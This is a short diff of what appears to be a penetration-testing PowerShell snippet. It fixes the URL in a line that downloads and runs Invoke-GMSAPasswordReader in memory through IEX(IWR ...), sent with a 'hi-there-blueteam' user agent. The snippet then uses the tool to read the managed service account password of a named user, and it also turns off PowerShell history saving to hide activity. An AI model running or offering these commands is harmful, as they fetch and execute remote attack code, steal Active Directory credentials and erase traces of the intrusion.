@@ -20,7 +20,7 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 
 # [system.net.webrequest]::defaultwebproxy.credentials = Get-Credential
 
-IEX(IWR -UseBasicParsing -UserAgent "hi-there-blueteam" 'https://raw.githubusercontent.com/ricardojba/Invoke-noPac/main/Invoke-GMSAPasswordReader.ps1')
+IEX(IWR -UseBasicParsing -UserAgent "hi-there-blueteam" 'https://raw.githubusercontent.com/ricardojba/Invoke-GMSAPasswordReader/main/Invoke-GMSAPasswordReader.ps1')
 
 Invoke-GMSAPasswordReader -Command "--AccountName jkohler"
 ```
